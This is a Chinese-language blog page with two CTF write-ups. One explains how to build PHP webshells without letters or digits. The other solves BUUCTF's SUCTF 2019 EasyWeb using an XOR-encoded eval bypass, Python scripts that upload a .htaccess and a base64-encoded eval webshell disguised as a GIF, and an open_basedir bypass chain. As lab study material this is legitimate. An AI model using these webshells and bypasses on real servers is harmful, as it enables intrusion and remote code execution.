<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">180</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/08/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/">不包含数字和字母的webshell</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-08</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经做了两题有关无数字和字母的getshell，这里整理一下‘</p>
<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="方法一：异或运算获得字符"><a href="#方法一：异或运算获得字符" class="headerlink" title="方法一：异或运算获得字符"></a>方法一：异或运算获得字符</h2><p>在PHP中，两个字符串进行异或操作以后，得到的还是一个字符串，原理很简单，直接贴脚本了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;!@#$%^*()+&lt;&gt;?;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">       <span class="comment"># if result==&#x27;_&#x27;:</span></span><br><span class="line">           print(str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result)</span><br></pre></td></tr></table></figure>

<p>同类型的还有一个取反</p>
<h2 id="方法二：-特性取字符"><a href="#方法二：-特性取字符" class="headerlink" title="方法二：++特性取字符"></a>方法二：++特性取字符</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210609005654.png" alt="img" style="zoom:50%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<h1 id="提高篇"><a href="#提高篇" class="headerlink" title="提高篇"></a>提高篇</h1><h3 id="长度限制-不包含-和"><a href="#长度限制-不包含-和" class="headerlink" title="长度限制+不包含$和_"></a>长度限制+不包含$和_</h3><h4 id="php7中关于变量处理的变化"><a href="#php7中关于变量处理的变化" class="headerlink" title="php7中关于变量处理的变化"></a>php7中关于变量处理的变化</h4><h5 id="1-解析顺序"><a href="#1-解析顺序" class="headerlink" title="1.解析顺序"></a>1.解析顺序</h5><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610002554.png" alt="img" style="zoom:50%;">
对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析

<h5 id="2-执行动态函数方法"><a href="#2-执行动态函数方法" class="headerlink" title="2.执行动态函数方法"></a>2.执行动态函数方法</h5><p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)(); &#x2F;&#x2F;(phpinfo)()</span><br></pre></td></tr></table></figure>

<h4 id="PHP5中如何执行方法"><a href="#PHP5中如何执行方法" class="headerlink" title="PHP5中如何执行方法"></a>PHP5中如何执行方法</h4><h5 id="思维导入"><a href="#思维导入" class="headerlink" title="思维导入"></a>思维导入</h5><p>大部分语言都不是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互，操作系统里面包含最重要的两个功能就是shell(系统命令)和文件系统。</p>
<p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p>
<p>这里有个知识点需要了解一下，在linux系统中，许多系统命令都是有自己的脚本文件在，我们可以通过调用这些脚本文件来执行shell命令，这也就是之前所说的linux系统中，一切皆文件的思想，即使用bash执行file文件中的命令</p>
<p>介绍两个shell知识点:<br>1、shell可以用.来执行任意脚本，并且不需要file有x权限<br>2、linux文件名支持用glob通配符代替</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>上传bash文件——执行文件</p>
<p>问题一：没有上传窗口文件该如何上传？</p>
<p>使用脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">files&#x3D;&#123;</span><br><span class="line">	&#39;file&#39;:open(&#39;1.txt&#39;,rb)</span><br><span class="line">&#125;</span><br><span class="line">url&#x3D;&quot;&quot;</span><br><span class="line">response&#x3D;requests.get(url,files&#x3D;files)</span><br><span class="line">print(reponse.txt)</span><br></pre></td></tr></table></figure>

<p>利用脚本post直接上传</p>
<p>问题二：不能用字母数字，如何选中所要执行的文件？</p>
<p>这个时候就利用了glob通配符的知识了，我们知道，上传的文件会被临时储存在/tmp/文件夹下，那么如何确定其他的字符呢？</p>
<p>*<em>首先</em>可以代表0个及以上的任意字符**<br><strong>？可以代表1个任意字符</strong></p>
<p>所以我们的文件名就可以表示为/*/??????或者/???/??????（这里假定文件名为6位）</p>
<p>但是此时，符合此文件名可能不止一位，所以该如何更精准的定位呢？</p>
<h4 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h4><p><strong>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”并且支持利用[0-9]来表示一个范围</strong>。</p>
<p>筛选方法：<br>1.???<code>[^x]</code>??筛选出第四个字符不是x的项<br>2.???[@-[]??筛选出第四个字符时大写字母的项（这里利用了ascc码的一个范围）</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610141755.png" alt="image.png"></p>
<p>参考:<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration70.incompatible.php">https://www.php.net/manual/zh/migration70.incompatible.php</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/06/08/buuctf18/">buuctf18</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-06-08</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉最近有点小浮躁，必须要尽快调整~脚踏实地才是最重要的</p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);<span class="comment">//不可以使用超过12种的字符</span></span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>思路:执行eval函数，然后上传文件<br>首先需要绕过那个正则匹配字母数字的，之前使用异或去取字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;\/&quot;</span></span><br><span class="line"><span class="comment"># if re.match(&#x27;[a-zA-Z0-9]+&#x27;,&#x27;a&#x27;):</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">print(chr(ord(<span class="string">&#x27;!&#x27;</span>)^ord(<span class="string">&#x27;@&#x27;</span>)))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(str)):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        result=chr(ord(str[j])^ord(str[i]))</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&#x27;[a-zA-Z0-9]+&#x27;</span>,result):</span><br><span class="line">           <span class="keyword">print</span> str[j]+<span class="string">&quot;^&quot;</span>+str[i]+<span class="string">&quot;=&quot;</span>+result</span><br><span class="line">           print(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是发现也有过滤一些特殊字符，所以这个方法不太行，</p>
<p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4306654/blog/3363280">https://my.oschina.net/u/4306654/blog/3363280</a><br>用一下其他办法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">find = [<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">        result=chr(i^j)</span><br><span class="line">        <span class="keyword">if</span>(result <span class="keyword">in</span> find):</span><br><span class="line">            a= i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)<span class="comment">#将十进制整数，转化为bytes(十六进制)</span></span><br><span class="line">            b= j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            a= urllib.parse.quote(a)<span class="comment">#进行URL编码</span></span><br><span class="line">            b= urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">&quot;%s:%s^%s&quot;</span>%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>我们将范围扩大到很多不可见字符，这里就是使用ascii码了，然后为了防止被过滤，我就找了最下面的几个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t:%FE^%AA</span><br><span class="line">_:%FE^%A1</span><br><span class="line">G:%FE^%B9</span><br><span class="line">E:%FE^%BB</span><br></pre></td></tr></table></figure>

<p>绕过18个字符就是用get再传参一次</p>
<p><strong>first_payload for test:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1&#x3D;phpinfo</span><br><span class="line">$&#123;_GET&#125;&#123;%A1&#125;()&#x3D;$_GET(%A1)</span><br></pre></td></tr></table></figure>

<p>这里有个很奇怪的点，就是这个t，别人跑出来都是AA我跑出来是8A=-=，所以payload一直不对，但是放到python里面去解析，去反编码回去，又是正确的?难道又是版本问题吗？</p>
<p>总<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610144501.png" alt="img" style="zoom:67%;"></p>
<p>总之，到这里就可以继续往下走了，接下来看源码，发现需要上传文件了<br>看一下过滤吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">  mkdir($userdir);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">      $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">      $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">      <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">      $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">      @move_uploaded_file($tmp_name, $path);</span><br><span class="line">      print_r($path);</span><br></pre></td></tr></table></figure>

<p>1.检查后缀是否含有ph、检查内容是否含有&lt;?、检查是否为图片<br><img src="https://img2018.cnblogs.com/blog/1063309/201907/1063309-20190718171528562-530311975.png" alt="img" style="zoom:67%;"></p>
<h3 id="文件上传思路"><a href="#文件上传思路" class="headerlink" title="文件上传思路"></a>文件上传思路</h3><p>由于过滤了ph后缀的文件，所以我们只能上传user.ini或者htaccess，这里显然上传htaccess更合适，因为可以用来将其他非php的文件解析为php，但是接下来会检查内容是否含有&lt;? 这里就是一个难点了，因为此时短标签绕过不了，想着使用&lt;script&gt;进行绕过，但是刚刚我们可以看到这个php版本为7.几的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210610153840.png" alt="img" style="zoom:67%;"></p>
<p>这里有两种方法，一种是改变php的编码格式，另一种是以加密的形式传入，并解密读取<br>接下来是绕过图片检查，这里使用的函数是exit_imagetype()<br>**exif_imagetype()**读取图像的第一个字节并检查其签名。此时就很妨碍我们上传.htaccess了，这样就会不符合.htaccess的书写语法，导致无法解析.htaccess，那么我们该如何操作呢？这里说一下看完WP后的理解：要满足该函数的检查，首先会检查第一个字节，可以发现，第一个字节为空可以绕过检查，即/x00但是因为是图片检查，又需要定义其大小才会符合图片的定义（这里由于不了解exif_imagetype()的C代码运行逻辑，所以只能先猜测一下，待后面找到了再来补充，问了一下学长，确实是这样），接下来就是书写.htaccess的内容了，然后上传完.htaccess就上传我们的马，此时也需要加密一波再进行上传，头的检查和刚才的一样。</p>
<h4 id="htaccess文件内容构造"><a href="#htaccess文件内容构造" class="headerlink" title=".htaccess文件内容构造"></a>.htaccess文件内容构造</h4><p>首先解决第一个问题:没有上传窗口如何上传文件——使用Python的requests库上传文件<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/five3/article/details/74913742">https://blog.csdn.net/five3/article/details/74913742</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">conten_htacc=<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .gg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=tt.gg#这里就将其进行base64进行编码</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://135d9802-5db9-41f2-8761-9eeb38a3ece9.node3.buuoj.cn?_=$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,conten_htacc,<span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p>根据这个获取文件夹所在位置<br>upload/tmp_4f105b2c0ec2da14aae9b130ee13f8e9/.htaccess<br>接下来是构造我们的图片马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://a199f759-9689-41ad-b7a7-c0bab6144be6.node3.buuoj.cn/?_=$&#123;%A1%B9%BB%AA^%FE%FE%FE%FE&#125;&#123;%A1&#125;();&amp;%A1=get_the_flag&quot;</span></span><br><span class="line">content_hta=<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .test</span></span><br><span class="line"><span class="string">php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_233e0752380798f15678fca34b470aea/1.test</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">file1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,content_hta,<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=file1).text</span><br><span class="line">print(r)</span><br><span class="line">txt_content=<span class="string">b&quot;GIF89a&quot;</span>+<span class="string">b&quot;aa&quot;</span>+base64.b64encode(<span class="string">b&quot;&lt;?php @eval($_GET[cmd])?&gt;&quot;</span>)</span><br><span class="line">file2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.test&#x27;</span>,txt_content,<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=s.post(url,files=file2).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>

<p>这边有个小细节 因为我们需要让php中的内容进行base64解码，但是前面又有个GIF98a不是base64编码内容，为了不让编码紊乱，base64的编码是将每三个字符转化为四个字符，那么解码的时候就会将原本的四个字符转化为三个字符，所以此时要多加两个字符，才不会影响到后面的马<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210611093317.png" alt="img" style="zoom:67%;"></p>
<p>没办法用蚁剑直接连接，推测是因为路径限制<br>接下来我们要做的就是绕过open_basedir，进行文件的读取</p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
<p><a target="_blank" rel="noopener" href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></p>
<p>这篇文章有关于open_basedir绕过的底层详解<br>看完以后我的理解是这样，ini_set open_basedir只是关注绝对路径和相对路径的拼接，其实是没有关注相对路径是会发生变化的</p>
<p>这里举个例子说明:<br>假设我们的open_basedir为/var/www/html/ 我们位于/var/www/html/test 目录下，执行第一个ini_set后，首先判断/var/www/html/test/..即/var/www/html/是否为open_basedir内，判断成功，<strong>因此直接更新open_basedir为..</strong><br><strong>chdir() 函数改变当前的目录。</strong>那么接下来我们执行chdir(‘..’) ..根据当前目录补全后为/var/www/html 而open_basedir补全以后也是var/www/html 同样满足，所以我们就可以这样一直跳转到根目录下</p>
<p>POC链：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210611105042.png" alt="img" style="zoom:67%;">
可以看到flag文件了

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉这道题真的收获很多，这边理一下：<br>首先是思路:无字母数字如何getshell？——&gt;如何绕过文件上传限制——&gt;如何绕过open_basedir读取文件</p>
<p>收获知识点：<br>1.无字母数字获取脚本编写<br>2.PHP7特性下，变量解析的更新<br>3.htaccess+文件包含绕过内容过滤以及exif_imagetype的bypass<br>4.open_basedir+ini_set+chdir绕过open_basedir<br>没有实践的点记录一下：<br>exif_imagetype()以及open_basedir()+ini_set()函数的底层代码跳转过程</p>
<p>参考：<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/">https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11488051.html">https://www.cnblogs.com/20175211lyz/p/11488051.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6f05923012d7">https://www.jianshu.com/p/6f05923012d7</a></p>
<p><a target="_blank" rel="noopener" href="https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/">https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/</a></p>
<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/</a></p>
